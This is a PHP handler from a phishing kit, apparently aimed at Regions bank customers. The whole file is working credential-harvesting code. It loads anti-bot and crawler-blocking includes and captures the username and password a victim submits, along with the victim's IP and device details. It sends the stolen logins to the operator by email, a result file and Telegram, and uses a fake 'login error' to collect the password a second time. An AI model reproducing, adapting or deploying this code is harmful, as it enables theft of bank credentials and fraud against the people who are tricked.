<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";

	
if(isset($_POST['grrbow'])){
	if(!empty($_POST['used'])){
		$_SESSION['used'] = $_POST['used'];
		if(isset($_GET[''.$theerrkey.''])){header('location:'.$index.'?getp=on&'.$theerrkey.'=On');} else{header('location:'.$index.'?getp=on');}
	} else{header("location:".$index."?".$theerrkey."=kn0w");}
}
elseif(isset($_POST['btntmac'])){
$user = $_POST['used'];$password = $_POST['passi'];
if(!empty($_POST['used']) && !empty($_POST['passi']) && !preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($user))){
    if(strlen($password) > 5 && strlen($user) > 3){
		
	///////////////////////// MAIL PART //////////////////////
		
        $user        = $_POST['used'];
        $password     = $_POST['passi'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET[''.$theerrkey.''])){$reshead="--------------- CONFIRM REGIONS LOG ----------------";}
		else{$reshead="--------------- 🍃 NEW REGIONS LOG 🍃 --------------";};
        $Info_LOG = "
|--===-====-===-- $resultheading --===-====-===--|
$reshead
UserName         : $user 
Password         : $password ";
		if(isset($_GET[''.$theerrkey.''])){$_SESSION['fullz'].=$Info_LOG;} else{$_SESSION['fullz']=$Info_LOG;}
$Info_LOG.="
".$_SESSION['device'];


// Don't Touche
//Email
        if ($Send_Email == 1) {
			$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
            $subject = $PublicIP.' 🍃 '.$i.' REGIONS L0GIN';$headers = 'From: YoCHI <yochsowncitibuster@yochthecitiman.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET[''.$theerrkey.'']) && $doubleloginentry==1){header("location:".$index."?ent".$theerrkey."ryerr=c".md5(rand(100, 999999999))."&".$theerrkey."=On");}
		else{unset($_SESSION['used']);if($usecaution==1){header("location:note?id=myaccount&y=".md5(rand(100, 999999999))."");} else{header("location:evm?stat=myaccou&y=".md5(rand(100, 999999999))."");};};
    }
    else{
		header("location:".$index."?".$theerrkey."=c".md5(rand(100, 999999999))."");
    };
}
else{
	header("location:".$index."?".$theerrkey."=c3Fauth".md5(rand(100, 999999999))."");
};
};
?>